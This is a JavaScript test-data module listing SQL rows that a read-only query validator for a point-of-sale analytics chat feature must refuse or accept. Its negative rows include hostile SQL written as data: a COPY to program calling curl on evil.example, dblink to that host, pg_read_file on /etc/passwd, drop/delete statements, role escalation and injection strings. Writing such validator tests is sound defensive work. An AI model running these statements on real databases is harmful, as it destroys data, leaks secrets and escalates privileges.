// The Explore negative corpus (spec 4.7). PLAIN DATA so the validator test (test/chat-explore-negative.test.ts) and the raw role
// proof (scripts/coop-explore-ro-proof.mjs) read the very same rows; explore-corpus.ts re-exports it for TypeScript.
// Row shape: {id, category, sql, gen?, expect: <ExploreErrorCode> | 'ok', db: 'MUST'|'BOUNDED'|'PARSER'|'OK'|'n/a', runtime?}
//  - db (spec 5.2): MUST = the database alone must refuse (proof: refused in M1, M2 and M3); BOUNDED = legal for the engine, stopped by
//    the clock; PARSER = the parser is the only layer (recorded, never fails the proof); OK = positive control (must run in M3);
//    n/a = refused before the database.
//  - expect 'ok' rows are positive controls: they prove the gate does not over-block. `runtime` = the code the DATABASE returns.
// Alias o = coop_explore_orders, e = coop_explore_events, l = coop_explore_event_leads.

const O = 'coop_explore_orders';
const BASE = `select o.id from ${O} o where o.remarks = '`;
const pad = (n) => {
  const head = BASE;
  const tail = "'";
  return head + 'x'.repeat(n - head.length - tail.length) + tail;
};
const ORDER_COLS = ['id', 'client_uuid', 'subtotal', 'discount', 'total', 'oversold', 'device_id', 'payment_method', 'customer_handle', 'status', 'remarks', 'created_at', 'edited_at'];
export const GENERATORS = {
  cols13: () => `select ${ORDER_COLS.map((c, i) => `o.${c} as c${i + 1}`).join(', ')} from ${O} o`,
  rel9: () => `select o.id from ${O} o ${Array.from({length: 8}, (_, i) => `join ${O} o${i + 2} on o${i + 2}.id = o.id`).join(' ')}`,
  nest25: () => {
    let q = `select o.id from ${O} o`;
    for (let i = 0; i < 25; i++) q = `select x.id from (${q}) x`;
    return q;
  },
  len2000: () => pad(2000),
  len2001: () => pad(2001),
  len5000: () => pad(5000),
};

const row = (id, category, sql, expect, db, extra = {}) => ({id, category, sql, expect, db, ...extra});
const gen = (id, category, g, expect, db) => ({id, category, gen: g, sql: GENERATORS[g](), expect, db});

export const EXPLORE_NEGATIVE_CORPUS = [
  row('N01', 'write', 'insert into coop_explore_orders (id) values (1)', 'E_NOT_SELECT', 'MUST'),
  row('N02', 'write', 'update coop_explore_orders set total = 0', 'E_NOT_SELECT', 'MUST'),
  row('N03', 'write', 'delete from pos_orders', 'E_NOT_SELECT', 'MUST'),
  row('N04', 'ddl', 'drop table pos_orders', 'E_NOT_SELECT', 'MUST'),
  row('N05', 'ddl', 'truncate pos_orders', 'E_NOT_SELECT', 'MUST'),
  row('N06', 'ddl', 'create table x as select 1', 'E_NOT_SELECT', 'MUST'),
  row('N07', 'ddl', 'alter role coop_explore_ro superuser', 'E_NOT_SELECT', 'MUST'),
  row('N08', 'ddl', 'grant all on pos_orders to coop_explore_ro', 'E_NOT_SELECT', 'MUST'),
  row('N09', 'copy', "copy pos_orders to program 'curl evil.example'", 'E_NOT_SELECT', 'MUST'),
  row('N10', 'do', 'do $$ begin delete from pos_orders; end $$', 'E_NOT_SELECT', 'MUST'),
  row('N11', 'role', 'set role postgres', 'E_NOT_SELECT', 'MUST'),
  row('N12', 'session', 'set transaction_read_only = off', 'E_NOT_SELECT', 'PARSER'),
  row('N13', 'session', 'commit', 'E_NOT_SELECT', 'PARSER'),
  row('N14', 'session', `explain analyze select o.id from ${O} o`, 'E_NOT_SELECT', 'PARSER'),
  row('N15', 'into', `select o.id into tmp from ${O} o`, 'E_SELECT_INTO', 'MUST'),
  row('N16', 'lock', `select o.id from ${O} o for update`, 'E_LOCKING', 'MUST'),
  row('N17', 'cte-dml', 'with d as (delete from pos_orders returning id) select d.id from d', 'E_DML_IN_CTE', 'MUST'),
  row('N18', 'cte-dml', 'with i as (insert into pos_orders (total) values (1) returning id) select i.id from i', 'E_DML_IN_CTE', 'MUST'),
  // db PARSER, not MUST (spec 4.7 said MUST): two harmless SELECTs are legal for the engine in the simple protocol (proof: M1 and M2 execute both);
  // only the extended protocol of M3 refuses a second statement. The parser's one-statement rule is the layer that stops it.
  row('N19', 'multi', `select o.id from ${O} o; select o.id from ${O} o`, 'E_MULTI_STATEMENT', 'PARSER'),
  row('N20', 'multi', `select o.id from ${O} o; drop table pos_orders`, 'E_MULTI_STATEMENT', 'MUST'),
  row('N21', 'multi', `select o.id from ${O} o; commit; delete from pos_orders`, 'E_MULTI_STATEMENT', 'MUST'),
  row('N22', 'multi-lexical', `select o.id from ${O} o； drop table pos_orders`, 'E_SYNTAX', 'MUST'),
  // Train 3 (direct reads): the database now READS base tables, coop_chat_* views and the leads/digest tables, so these rows are 'OK'
  // for the role proof, and (Task 7, denylist parser) positive controls for the parser too.
  row('N23', 'relation', 'select o.id from pos_orders o', 'ok', 'OK'),
  row('N24', 'relation', 'select o.id from public.pos_orders o', 'ok', 'OK'),
  row('N25', 'relation', 'select o.id from coop_chat_orders o', 'ok', 'OK'),
  row('N26', 'relation', 'select u.id from auth.users u', 'E_RELATION', 'MUST'),
  row('N27', 'relation', `select o.id from other.${O} o`, 'E_RELATION', 'MUST'),
  row('N28', 'relation', 'select s.lead_id from spin_wheel_leads s', 'ok', 'OK'),
  row('N29', 'relation', 'select d.id from digest_archive d', 'ok', 'OK'),
  row('N30', 'relation-case', 'select o.id from "COOP_EXPLORE_ORDERS" o', 'E_RELATION', 'MUST'),
  row('N31', 'lexical', 'select o.id from U&"pos\\005forders" o', 'ok', 'OK'),
  row('N32', 'lexical', 'select o.id from U&"coop\\005fexplore\\005forders" o', 'ok', 'OK'),
  row('N33', 'relation-node', `select o.id from ${O} o tablesample system (100)`, 'E_NODE', 'PARSER'),
  row('N34', 'catalog', 'select c.relname from pg_class c', 'E_CATALOG', 'PARSER'),
  row('N35', 'catalog', 'select t.table_name from information_schema.tables t', 'E_CATALOG', 'PARSER'),
  row('N36', 'catalog', 'select r.rolname from pg_roles r', 'E_CATALOG', 'PARSER'),
  row('N37', 'catalog-cast', `select o.id from ${O} o where o.id = 'pos_orders'::regclass::int8`, 'E_CAST', 'PARSER'),
  row('N38', 'function', `select pg_sleep(10) from ${O} o`, 'E_FUNCTION_DENIED', 'BOUNDED'),
  row('N39', 'function', `select o.id from ${O} o where pg_sleep(10) is not null`, 'E_FUNCTION_DENIED', 'BOUNDED'),
  row('N40', 'function', `select dblink('host=evil.example', 'select 1') from ${O} o`, 'E_FUNCTION_DENIED', 'MUST'),
  row('N41', 'function', `select set_config('statement_timeout', '0', false) from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('N42', 'function', `select pg_read_file('/etc/passwd') from ${O} o`, 'E_FUNCTION_DENIED', 'MUST'),
  row('N43', 'function', `select lo_import('/etc/passwd') from ${O} o`, 'E_FUNCTION_DENIED', 'MUST'),
  row('N44', 'function', `select current_setting('server_version') from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  // db PARSER, not BOUNDED (spec 4.7 said BOUNDED): the proof measured the 5 s statement_timeout arriving after 6.6 to 10.7 s, because the
  // 1 GB allocation inside repeat() is not interruptible. The clock does not reliably bound it; the function denylist is the only layer.
  row('N45', 'function', `select repeat('a', 1000000000) from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('N46', 'function', `select version() from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('N47', 'function', `select current_user from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('N48', 'function-rpc', `select fake_write_rpc() from ${O} o`, 'E_FUNCTION', 'MUST'),
  row('N49', 'function', `select o.id, random() as r from ${O} o`, 'E_FUNCTION', 'PARSER'),
  row('N50', 'function-srf', `select generate_series(1, 100000000) as n from ${O} o`, 'E_FUNCTION', 'BOUNDED'),
  row('N51', 'function-qual', `select myschema.lower(o.status) as s from ${O} o`, 'E_FUNCTION', 'MUST'),
  row('N52', 'function-ok', `select pg_catalog.lower(o.status) as s from ${O} o`, 'ok', 'OK'),
  row('N53', 'operator', `select o.total operator(pg_catalog.+) 1 as t from ${O} o`, 'E_OPERATOR', 'PARSER'),
  row('N54', 'column', `select o.api_key from ${O} o`, 'E_BLOCKED_COLUMN', 'MUST'),
  row('N55', 'column-case', `select o."Password" from ${O} o`, 'E_BLOCKED_COLUMN', 'MUST'),
  row('N56', 'column', `select o.id from ${O} o where o.pin_hash = 'x'`, 'E_BLOCKED_COLUMN', 'MUST'),
  row('N57', 'star', `select * from ${O}`, 'E_SELECT_STAR', 'n/a'),
  row('N58', 'star', `select o.* from ${O} o`, 'E_SELECT_STAR', 'n/a'),
  row('N59', 'star-ok', `select count(*) as orders_count from ${O} o`, 'ok', 'OK'),
  row('N60', 'cross-join', `select o.id from ${O} o, coop_explore_events e`, 'E_CROSS_JOIN', 'BOUNDED'),
  row('N61', 'cross-join', `select o.id from ${O} o join coop_explore_events e on true`, 'E_CROSS_JOIN', 'BOUNDED'),
  row('N62', 'lateral', `select o.id from ${O} o join lateral (select e.event_id from coop_explore_events e) x on x.event_id = o.event_id`, 'E_LATERAL', 'PARSER'),
  row('N63', 'recursive', 'with recursive r as (select 1 as n union all select r.n + 1 from r) select r.n from r', 'E_RECURSIVE', 'BOUNDED'),
  row('N64', 'values', 'select v.x from (values (1), (2)) v(x)', 'E_VALUES', 'PARSER'),
  row('N65', 'param', `select o.id from ${O} o where o.id = $1`, 'E_PARAM', 'n/a'),
  row('N66', 'constant', 'select 42 as total_php', 'E_CONSTANT_COLUMN', 'PARSER'),
  row('N67', 'constant-cte', 'with c as (select 99999 as revenue_php) select c.revenue_php from c', 'E_CONSTANT_COLUMN', 'PARSER'),
  row('N68', 'dollar-quote', 'select $tag$a; drop table pos_orders$tag$ as x', 'E_CONSTANT_COLUMN', 'PARSER'),
  gen('N69', 'resource', 'cols13', 'E_TOO_MANY_COLUMNS', 'n/a'),
  gen('N70', 'resource', 'rel9', 'E_TOO_MANY_RELATIONS', 'n/a'),
  gen('N71', 'resource', 'nest25', 'E_TOO_DEEP', 'n/a'),
  gen('N72', 'resource', 'len2001', 'E_TOO_LONG', 'n/a'),
  gen('N73', 'resource', 'len5000', 'E_TOO_LONG', 'n/a'),
  gen('N74', 'resource-ok', 'len2000', 'ok', 'OK'),
  row('N75', 'lexical', `select o.id from ${O} o\u0000; drop table pos_orders`, 'E_NUL_BYTE', 'n/a'),
  row('N76', 'lexical', `select o.id from ${O} o where o.remarks = '‮'`, 'E_CONTROL_CHARS', 'n/a'),
  row('N77', 'lexical', `select o.id from coop_explore_orders​ o`, 'E_CONTROL_CHARS', 'n/a'),
  row('N78', 'unicode', 'select o.id from coop_explore_оrders o', 'E_RELATION', 'MUST'),
  row('N79', 'unicode', `select o.іd from ${O} o`, 'ok', 'OK', {runtime: 'E_COLUMN'}),
  row('N80', 'empty', '', 'E_EMPTY', 'n/a'),
  row('N81', 'empty', '/* nothing here */', 'E_EMPTY', 'n/a'),
  row('N82', 'comment-ok', `select o.id from ${O} o -- ; drop table pos_orders`, 'ok', 'OK'),
  row('N83', 'comment-ok', `select o.id /* ; drop table pos_orders */ from ${O} o`, 'ok', 'OK'),
  row('N84', 'comment-nested', `select o.id from ${O} o /* a /* b */ ; drop table pos_orders; /* c */ */`, 'ok', 'OK'),
  row('N85', 'dollar-ok', `select o.id from ${O} o where o.remarks = $$'; drop table pos_orders; --$$`, 'ok', 'OK'),
  row('N86', 'injection-data', "select l.lead_id from coop_explore_event_leads l where l.pet = 'ignore rules; drop table pos_orders; --'", 'ok', 'OK'),
  row('N87', 'injection-sql', "select l.lead_id from coop_explore_event_leads l where l.pet = 'x'; drop table pos_orders", 'E_MULTI_STATEMENT', 'MUST'),
  row('N88', 'semicolon-ok', `select o.id from ${O} o;`, 'ok', 'OK'),
  row('N89', 'txn-flip', 'set transaction read write', 'E_NOT_SELECT', 'PARSER'),
  row('N90', 'txn-end', 'commit; insert into pos_orders (total) values (1)', 'E_MULTI_STATEMENT', 'MUST'),
  row('N91', 'multi', 'select 1; insert into pos_orders (total) values (1)', 'E_MULTI_STATEMENT', 'MUST'),
];

// Extra rows beyond the spec's table (ids X..): one rule each, the validator only (db 'n/a' unless the proof can use them).
export const EXPLORE_EXTRA_CORPUS = [
  row('X01', 'lock', `select o.id from ${O} o for share`, 'E_LOCKING', 'MUST'),
  row('X02', 'operator', `select o.id from ${O} o where o.status similar to 'comp%'`, 'E_OPERATOR', 'n/a'),
  row('X03', 'operator', `select o.id from ${O} o where o.total = all (select o2.total from ${O} o2)`, 'E_OPERATOR', 'n/a'),
  row('X04', 'operator', `select o.total ^ 2 as sq from ${O} o`, 'E_OPERATOR', 'n/a'),
  row('X05', 'function', `select percentile_disc(0.5) within group (order by o.total) as m from ${O} o`, 'E_FUNCTION', 'n/a'),
  row('X06', 'function', `select lower(o.status) within group (order by o.id) as s from ${O} o`, 'E_FUNCTION', 'n/a'),
  row('X07', 'function', `select pg_catalog.pg_sleep(10) from ${O} o`, 'E_FUNCTION_DENIED', 'BOUNDED'),
  row('X08', 'function', `select o.id from ${O} o where o.id = (select txid_current())`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('X09', 'function', `select session_user from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('X10', 'function', `select current_catalog from ${O} o`, 'E_FUNCTION_DENIED', 'PARSER'),
  row('X11', 'function', `select localtime as t from ${O} o`, 'E_FUNCTION', 'n/a'),
  row('X12', 'function', `select nextval('x') from ${O} o`, 'E_FUNCTION_DENIED', 'MUST'),
  row('X13', 'cast', `select o.id::bytea as b from ${O} o`, 'E_CAST', 'n/a'),
  row('X14', 'cast', `select o.status::varchar as s from ${O} o`, 'E_CAST', 'n/a'),
  row('X15', 'cast', `select o.status::text[] as s from ${O} o`, 'E_CAST', 'n/a'),
  row('X16', 'node', `select array[o.id] as a from ${O} o`, 'E_NODE', 'n/a'),
  row('X17', 'node', `select o.status collate "en_US" as s from ${O} o`, 'E_NODE', 'n/a'),
  row('X18', 'node', `select count(*) as n from ${O} o group by grouping sets ((o.status), ())`, 'E_NODE', 'n/a'),
  row('X19', 'node', `select (o.id).x as a from ${O} o`, 'E_NODE', 'n/a'),
  row('X21', 'node', `select o.id from only ${O} o`, 'E_NODE', 'n/a'),
  row('X22', 'cross-join', `select o.id from ${O} o natural join coop_explore_events e`, 'E_CROSS_JOIN', 'n/a'),
  row('X23', 'cross-join', `select o.id from ${O} o cross join coop_explore_events e`, 'E_CROSS_JOIN', 'n/a'),
  row('X24', 'cross-join', `select o.id from ${O} o join coop_explore_events e on 1 = 1`, 'E_CROSS_JOIN', 'n/a'),
  row('X25', 'sublink', `select o.id from ${O} o where o.id = any (array[1, 2])`, 'E_NODE', 'n/a'),
  row('X26', 'column', `select o.id from ${O} o where o.id in (select p.id from ${O} p where p.client_token = 'x')`, 'E_BLOCKED_COLUMN', 'n/a'),
  row('X27', 'catalog', `select o.id from ${O} o where o.id in (select c.oid from pg_catalog.pg_class c)`, 'E_CATALOG', 'n/a'),
  row('X28', 'catalog', 'select c.relname from pg_catalog.pg_class c', 'E_CATALOG', 'n/a'),
  row('X29', 'catalog', `select o.id from ${O} o join pg_roles r on r.oid = o.id`, 'E_CATALOG', 'n/a'),
  row('X30', 'cte-dml', `with u as (update pos_orders set total = 0 returning id) select u.id from u`, 'E_DML_IN_CTE', 'MUST'),
  row('X31', 'cte-scope', `select o.id from ${O} o where o.id in (with pos_orders as (select p.id from ${O} p) select pos_orders.id from pos_orders) and o.id in (select q.id from pos_orders q)`, 'ok', 'OK'),
  row('X32', 'values', `insert into pos_orders (total) values (1)`, 'E_NOT_SELECT', 'MUST'),
  row('X33', 'union', `select o.id from ${O} o union select p.id from pos_orders p`, 'ok', 'OK'),
  row('X34', 'constant', `select 'a' as label from ${O} o`, 'E_CONSTANT_COLUMN', 'n/a'),
  row('X35', 'constant', `select o.id from ${O} o where o.id in (select 1)`, 'E_CONSTANT_COLUMN', 'n/a'),
  row('X36', 'lexical', `select o.id from ${O} o⁦`, 'E_CONTROL_CHARS', 'n/a'),
  row('X37', 'lexical', `select o.id from ${O} o\u0007`, 'E_CONTROL_CHARS', 'n/a'),
  row('X38', 'syntax', `select o.id from ${O} o where (`, 'E_SYNTAX', 'n/a'),
  row('X39', 'syntax', `select o.id from ${O} o /* unterminated`, 'E_SYNTAX', 'n/a'),
  row('X40', 'syntax', `select o.id from ${O} o) union (select 1`, 'E_SYNTAX', 'n/a'),
  row('X41', 'input', `   \n\t `, 'E_EMPTY', 'n/a'),
  row('X42', 'session', `begin`, 'E_NOT_SELECT', 'PARSER'),
  row('X43', 'session', `show statement_timeout`, 'E_NOT_SELECT', 'PARSER'),
  row('X44', 'session', `prepare p as select 1`, 'E_NOT_SELECT', 'PARSER'),
  row('X45', 'session', `call fake_write_rpc()`, 'E_NOT_SELECT', 'MUST'),
  row('X46', 'session', `listen coop`, 'E_NOT_SELECT', 'PARSER'),
  row('X47', 'session', `vacuum pos_orders`, 'E_NOT_SELECT', 'PARSER'),
  row('X48', 'session', `merge into pos_orders using pos_orders p on true when matched then delete`, 'E_NOT_SELECT', 'MUST'),
  row('X49', 'values', `values (1)`, 'E_VALUES', 'PARSER'),
  // Task 7 (Task 3 security review): query-running functions run a query given as a STRING, as the login; casts to user types (a
  // domain CHECK calls a function); DDL and SET. db MUST = the database refuses alone; PARSER = the database runs it (or leaks through
  // an error message, X58), the parser is the only layer.
  row('X50', 'query-fn', "select query_to_xml('select m.marketplace from marketplace_tokens m', true, false, '') as x", 'E_FUNCTION_DENIED', 'MUST'),
  row('X51', 'query-fn', "select query_to_xml('select f.label from explore_fixture_sd_rows() f', true, false, '') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X52', 'query-fn', "select table_to_xml('explore_fixture_notes', true, false, '') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X53', 'query-fn', "select query_to_xmlschema('select o.id from pos_orders o', true, false, '') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X54', 'query-fn', "select schema_to_xml('public', true, false, '') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X55', 'query-fn', "select database_to_xml(true, false, '') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X56', 'query-fn', "select s.word from ts_stat('select to_tsvector(''simple'', m.label) from explore_fixture_mixed m') s", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X57', 'query-fn', "select ts_rewrite('a & b'::tsquery, 'select ''a''::tsquery, ''c''::tsquery') as x", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X58', 'cast-domain', 'select o.id::explore_fixture_dom as v from explore_fixture_mixed o', 'E_CAST', 'PARSER'),
  row('X59', 'cast-schema', 'select o.status::public.text as v from pos_orders o', 'E_CAST', 'n/a'),
  row('X60', 'ddl-temp', 'create temporary view tv as select o.id from pos_orders o', 'E_NOT_SELECT', 'MUST'),
  row('X61', 'ddl-temp', 'create temp table tt (id int)', 'E_NOT_SELECT', 'MUST'),
  row('X62', 'session', "select set_config('search_path', 'pg_temp', true) as x from pos_orders o", 'E_FUNCTION_DENIED', 'PARSER'),
  row('X63', 'session', 'set search_path = pg_temp', 'E_NOT_SELECT', 'PARSER'),
  row('X64', 'relation', 'select m.marketplace from marketplace_tokens m', 'E_RELATION', 'MUST'),
  row('X65', 'relation-tenant', 'select g.store_code from gl_fixture_stores g', 'E_RELATION', 'MUST'),
  row('X66', 'column', 'select x.api_key from explore_fixture_mixed x', 'E_BLOCKED_COLUMN', 'MUST'),
];

// Positive controls: constructs the owner's questions need. Each must pass the parser AND execute on the local database.
// The first 18 are the spec 6.6 examples (fictional literals) in full; P-rows exercise the rest of the allowlists.
const EX = [
  `with ev as (select e.event_id from coop_explore_events e where e.name ilike '%demo pet fair%') select coalesce(o.pet_type, 'untagged') as pet, count(*) as orders_count, round(sum(o.total), 2) as revenue_php from coop_explore_orders o join ev on ev.event_id = o.event_id where o.status = 'completed' group by 1 order by revenue_php desc`,
  `select e.name as event, coalesce(o.pet_type, 'untagged') as pet, count(*) as orders_count, round(sum(o.total), 2) as revenue_php from coop_explore_orders o join coop_explore_events e on e.event_id = o.event_id where (e.name ilike '%demo pet fair%' or e.name ilike '%sample mall%') and o.status = 'completed' group by e.name, coalesce(o.pet_type, 'untagged') order by e.name, revenue_php desc`,
  `select btrim(lower(split_part(l.pet, '/', 2))) as breed, count(*) as leads_count from coop_explore_event_leads l join coop_explore_events e on (l.collected_at at time zone 'Asia/Manila')::date between e.starts_on and coalesce(e.ends_on, e.starts_on) where e.name ilike '%demo pet fair%' and l.pet is not null group by 1 order by leads_count desc limit 25`,
  `select l.pet, count(*) as rows_count from coop_explore_event_leads l group by l.pet order by rows_count desc limit 30`,
  `select count(*) as rows_count, count(o.pet_type) as tagged_count from coop_explore_orders o where o.status = 'completed'`,
  `select (o.created_at at time zone 'Asia/Manila')::date as day, count(*) as voided_count from coop_explore_orders o where o.status = 'voided' and o.created_at >= date '2025-03-01' group by 1 order by 1`,
  `select extract(hour from o.created_at at time zone 'Asia/Manila')::int as hour_of_day, count(*) as orders_count from coop_explore_orders o where o.status = 'completed' group by 1 order by 1`,
  `select to_char(o.created_at at time zone 'Asia/Manila', 'Dy') as weekday, round(sum(o.total), 2) as revenue_php from coop_explore_orders o where o.status = 'completed' group by 1, extract(isodow from o.created_at at time zone 'Asia/Manila') order by extract(isodow from o.created_at at time zone 'Asia/Manila')`,
  `select o.customer_handle as handle, count(*) as orders_count, round(sum(o.total), 2) as spend_php from coop_explore_orders o where o.status = 'completed' and o.customer_handle is not null group by 1 order by spend_php desc limit 10`,
  `with h as (select o.customer_handle as handle, count(*) as n from coop_explore_orders o where o.status = 'completed' and o.customer_handle is not null group by 1) select count(*) as handles_count, count(*) filter (where h.n >= 2) as repeat_count, round(100.0 * count(*) filter (where h.n >= 2) / nullif(count(*), 0), 1) as repeat_pct from h`,
  `select (o.event_id is not null) as at_event, round(avg(o.discount), 2) as avg_discount_php, count(*) as orders_count from coop_explore_orders o where o.status = 'completed' group by 1`,
  `select e.name, e.starts_on from coop_explore_events e left join coop_explore_orders o on o.event_id = e.event_id and o.status = 'completed' where o.id is null`,
  `select b.name as bundle, count(*) as bundles_count, round(sum(i.line_total), 2) as revenue_php from coop_explore_order_items i join coop_explore_bundles b on b.bundle_id = i.bundle_id join coop_explore_orders o on o.id = i.order_id where i.bundle_id is not null and o.status = 'completed' group by 1 order by revenue_php desc`,
  `select p.name as product, sum(i.qty) as picks_units from coop_explore_order_items i join coop_explore_products p on p.product_id = i.product_id join coop_explore_orders o on o.id = i.order_id where i.bundle_group is not null and i.product_id is not null and o.status = 'completed' group by 1 order by picks_units desc limit 10`,
  `with items as (select i.order_id, sum(i.qty) as units from coop_explore_order_items i group by 1) select coalesce(o.pet_type, 'untagged') as pet, round(sum(o.total), 2) as revenue_php, sum(items.units) as units_count from coop_explore_orders o join items on items.order_id = o.id where o.status = 'completed' group by 1`,
  `select p.name as product, round(avg(c.new_price), 2) as avg_new_price_php, count(*) as changes_count from coop_explore_price_changes c join coop_explore_products p on p.product_id = c.product_id group by 1 order by changes_count desc limit 10`,
  `select l.prize, count(*) as leads_count from coop_explore_event_leads l where l.campaign ilike '%demo%' group by 1 order by leads_count desc`,
  `select count(*) filter (where l.email is not null) as email_count, count(*) filter (where l.email is null and l.instagram is not null) as instagram_only_count, count(*) as leads_count from coop_explore_event_leads l where l.consent_at is not null`,
];
const P = [
  [`window`, `select o.id, row_number() over (partition by o.pet_type order by o.total desc) as rn, sum(o.total) over (partition by o.pet_type) as pet_total_php from coop_explore_orders o where o.status = 'completed'`],
  [`percentile`, `select percentile_cont(0.5) within group (order by o.total) as median_php from coop_explore_orders o where o.status = 'completed'`],
  [`substring`, `select substring(o.status from 1 for 3) as s3, substr(o.status, 1, 2) as s2, left(o.status, 1) as l1, right(o.status, 1) as r1 from coop_explore_orders o`],
  [`trim`, `select trim(both ' ' from o.remarks) as t, ltrim(o.remarks) as lt, rtrim(o.remarks) as rt, upper(o.status) as u, initcap(o.status) as ic, length(o.status) as len, replace(o.status, 'c', 'k') as r, concat(o.status, '-', o.pet_type) as c from coop_explore_orders o`],
  [`dates`, `select date_trunc('week', o.created_at at time zone 'Asia/Manila') as wk, date_part('dow', o.created_at) as dow, now() as n, current_date as d, current_timestamp as ts, localtimestamp as lts, o.created_at + interval '1 day' as next_day from coop_explore_orders o`],
  [`case`, `select case when o.total > 500 then 'big' when o.total > 100 then 'mid' else 'small' end as size_label, greatest(o.total, o.subtotal) as g, least(o.total, o.subtotal) as l, nullif(o.discount, 0) as nd, coalesce(o.customer_handle, 'none') as h from coop_explore_orders o`],
  [`booleans`, `select o.id from coop_explore_orders o where o.pet_type is null and o.discount is not null and o.oversold is false and o.status in ('completed', 'voided') and o.total between 1 and 10000 and o.remarks not like 'bulk-%' and o.remarks !~ 'zzz' and o.id is distinct from 0`],
  [`jsonb`, `select d.id, d.digest ->> 'title' as title_text, jsonb_extract_path_text(d.digest, 'a', 'b') as ab, jsonb_array_length(d.digest -> 'items') as items_count from coop_explore_digest d`],
  [`casts`, `select o.id::text as t, o.total::numeric as n, o.total::float8 as f, o.total::int4 as i, o.id::int8 as b, o.created_at::date as d, o.created_at::timestamp as ts, o.created_at::timestamptz as tz, o.created_at - '1 day'::interval as prev from coop_explore_orders o`],
  [`series`, `select d.day from generate_series(date '2025-03-01', date '2025-03-05', interval '1 day') as d(day)`],
  [`exists`, `select e.event_id from coop_explore_events e where exists (select 1 from coop_explore_orders o where o.event_id = e.event_id) and e.event_id not in (select p.event_id from coop_explore_orders p where p.event_id is null)`],
  [`union`, `select o.status as label, count(*) as orders_count from coop_explore_orders o group by 1 union all select 'x' || e.status as label, count(*) as orders_count from coop_explore_events e group by 1`],
  [`using`, `select o.id, e.name from coop_explore_orders o join coop_explore_events e using (event_id)`],
  [`stringagg`, `select string_agg(distinct o.payment_method, ', ' order by o.payment_method) as methods from coop_explore_orders o`],
  [`offset`, `select o.id from coop_explore_orders o order by o.id desc limit 5 offset 2`],
  [`having`, `select o.pet_type, count(*) as orders_count from coop_explore_orders o group by o.pet_type having count(*) > 1`],
  [`mod`, `select (o.id % 2) as parity, o.total * 2 / 3 - 1 as math from coop_explore_orders o where o.id > -5`],
  [`ilike`, `select o.id from coop_explore_orders o where o.remarks ilike '%bulk%' and o.remarks ~* 'BULK' and o.remarks || 'x' is not null`],
  [`derived`, `select x.status, x.n from (select o.status, count(*) as n from coop_explore_orders o group by 1) x where x.n > 0`],
];
export const EXPLORE_POSITIVE_CORPUS = [
  ...EX.map((sql, i) => row(`E${String(i + 1).padStart(2, '0')}`, 'example', sql, 'ok', 'OK')),
  ...P.map(([name, sql], i) => row(`P${String(i + 1).padStart(2, '0')}`, `positive-${name}`, sql, 'ok', 'OK')),
];
